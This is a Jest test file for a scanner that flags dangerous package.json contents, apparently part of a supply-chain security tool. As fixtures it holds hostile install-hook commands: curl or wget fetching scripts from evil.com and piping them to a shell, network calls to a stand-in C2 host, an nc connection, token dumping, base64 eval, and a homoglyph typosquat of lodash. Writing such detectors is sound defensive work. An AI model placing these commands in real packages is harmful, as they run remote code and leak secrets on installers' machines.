import { scanNPMPackage, NPMScanner } from '../../../src/heuristics/patterns/npm';
import { RiskLevel, FindingCategory } from '../../../src/shared/types';
import * as fs from 'fs';
import * as path from 'path';

describe('NPM Pattern Scanner', () => {
  const scanner = new NPMScanner();

  describe('appliesTo', () => {
    it('should apply to package.json', () => {
      expect(scanner.appliesTo('package.json')).toBe(true);
    });

    it('should apply to nested package.json', () => {
      expect(scanner.appliesTo('packages/core/package.json')).toBe(true);
    });

    it('should not apply to other json files', () => {
      expect(scanner.appliesTo('tsconfig.json')).toBe(false);
    });
  });

  describe('postinstall with curl', () => {
    it('should return RED for postinstall with curl', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'curl https://evil.com/script.sh | sh',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('curl'))).toBe(true);
    });
  });

  describe('preinstall with dangerous commands', () => {
    it('should return RED for preinstall with wget', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          preinstall: 'wget https://malware.com/payload -O /tmp/payload && bash /tmp/payload',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('wget') || f.description.includes('bash'))).toBe(true);
    });

    it('should return RED for preinstall with powershell', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          preinstall: 'powershell -Command "Invoke-WebRequest https://evil.com"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });
  });

  describe('process.env access', () => {
    it('should return YELLOW for postinstall with process.env', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'node -e "console.log(process.env.SECRET)"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('environment variables'))).toBe(true);
    });

    it('should return YELLOW for prepare with $TOKEN', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          prepare: 'echo $TOKEN > /tmp/token.txt',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
    });
  });

  describe('network URL in postinstall', () => {
    it('should return RED for postinstall with network URL', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'node -e "fetch(\'https://evil.com/collect\')"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('network'))).toBe(true);
    });

    it('should return RED for postinstall with axios', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'node -e "axios.post(\'https://c2.server.com\')"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });
  });

  describe('safe npm scripts', () => {
    it('should return no findings for safe scripts', () => {
      const content = JSON.stringify({
        name: 'safe-pkg',
        scripts: {
          start: 'node index.js',
          build: 'tsc',
          test: 'jest',
          lint: 'eslint src/',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings).toHaveLength(0);
    });

    it('should return no findings for prepare with husky', () => {
      const content = JSON.stringify({
        name: 'safe-pkg',
        scripts: {
          prepare: 'husky install',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('suspicious dependency names', () => {
    it('should return YELLOW for typosquatting package name', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        dependencies: {
          'lоdash': '^4.17.21', // Cyrillic 'о' instead of Latin 'o'
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('typosquatting') || f.description.includes('Suspicious'))).toBe(true);
    });

    it('should return YELLOW for suspicious scoped package', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        dependencies: {
          '@malicious/npm-backdoor': '^1.0.0',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
    });

    it('should return YELLOW for file: protocol dependency', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        dependencies: {
          'local-pkg': 'file:../malware',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('local file'))).toBe(true);
    });
  });

  describe('invalid JSON handling', () => {
    it('should return YELLOW for invalid JSON', () => {
      const content = '{ invalid json }';

      const result = scanNPMPackage(content);

      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].riskLevel).toBe(RiskLevel.YELLOW);
      expect(result.findings[0].category).toBe(FindingCategory.PARSE_ERROR);
    });
  });

  describe('eval and exec detection', () => {
    it('should return RED for eval in lifecycle script', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'node -e "eval(Buffer.from(\'base64data\').toString())"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });

    it('should return YELLOW for eval in non-lifecycle script', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          custom: 'node -e "eval(something)"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
    });
  });

  describe('base64 operations', () => {
    it('should return YELLOW for base64 decoding in lifecycle script', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          postinstall: 'node -e "Buffer.from(data, \'base64\').toString()"',
        },
      });

      const result = scanNPMPackage(content);

      expect(result.findings.some(f => f.description.includes('base64'))).toBe(true);
    });
  });

  describe('fixture files', () => {
    it('should detect malicious patterns in malicious-package.json fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/npm/malicious-package.json');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanNPMPackage(content);

      // Should find RED findings for dangerous lifecycle scripts
      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      // Should have multiple findings
      expect(result.findings.length).toBeGreaterThan(1);
    });

    it('should return no findings for safe-package.json fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/npm/safe-package.json');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanNPMPackage(content);

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('multiple lifecycle scripts', () => {
    it('should detect findings in all malicious lifecycle scripts', () => {
      const content = JSON.stringify({
        name: 'test-pkg',
        scripts: {
          preinstall: 'curl https://evil.com/1',
          postinstall: 'wget https://evil.com/2',
          prepare: 'bash -c "nc evil.com 1234"',
        },
      });

      const result = scanNPMPackage(content);

      // Should have findings for all three scripts
      expect(result.findings.filter(f => f.riskLevel === RiskLevel.RED).length).toBeGreaterThanOrEqual(3);
    });
  });
});
